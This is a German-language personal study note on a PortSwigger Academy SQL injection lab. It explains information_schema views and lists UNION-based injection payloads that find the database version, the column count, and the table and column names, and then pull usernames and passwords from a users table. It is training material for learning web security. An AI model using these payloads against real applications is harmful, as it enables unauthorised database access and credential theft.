---
created:
  - "{{date: DD-MM-YYYY}} {{time}}"
aliases:
  - "Course Code:"
  - PSS-Portswigger-Academy
tags:
  - Course/
---
## Set Of Views

[SQL-Injection-Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
Die meisten Datenbanken haben etwas das nennt sich Set of Views und zeigt ein Informations Schema. Das ist wichtig für viele Daten weil es mühsam wäre für jeden User jeden einzelnen Eintrag aus der Datenbank abzufragen. Daher gibt es diese Listen die sich nur updaten wenn auch etwas in der Datenbank verändert wird - beschleunigt den Abruf und entlastet die Datenbank.
`SELECT * FROM information_schema.tables`

z. B: bei folgendem Aufbau. Erst schauen welche,
- Database Version
- Anzahl Elemente und welche Typen

`' UNION SELECT @@VERSION, NULL--` 
`' UNION SELECT 'a','a'--`

| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE |
| ------------- | ------------ | ---------- | ---------- |
| MyDatabase    | dbo          | Products   | BASE TABLE |
| MyDatabase    | dbo          | Users      | BASE TABLE |
| MyDatabase    | dbo          | Feedback   | BASE TABLE |
##### Table_Names herausfinden

`SELECT table_name,null FROM information_schema.tables`
returned Liste aller tables und finden: `users_ceswxa`
![[sqli_set_of_views1.PNG]]

##### Column_Names herausfinden

| TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | DATA_TYPE |
| ------------- | ------------ | ---------- | ----------- | --------- |
| MyDatabase    | dbo          | Users      | UserId      | INT       |
| MyDatabase    | dbo          | Users      | Username    | VARCHAR   |
| MyDatabase    | dbo          | Users      | Password    | VARCHAT   |
`' UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns WHERE table_name = 'users_ceswxa'--`
![[sqli_set_of_views2.PNG]]

-> Dann haben wir alle Informationen die wir brauchen und können einen Aufruf wie.
`password_tpmfyg`
`email`
`username_aqrsop`

Dann können wir etwas wie folgendes bauen:
`' UNION SELECT username_aqrsop,password_tpmfyg FROM users_ceswxa--`

![[sqli_set_of_views3.PNG]]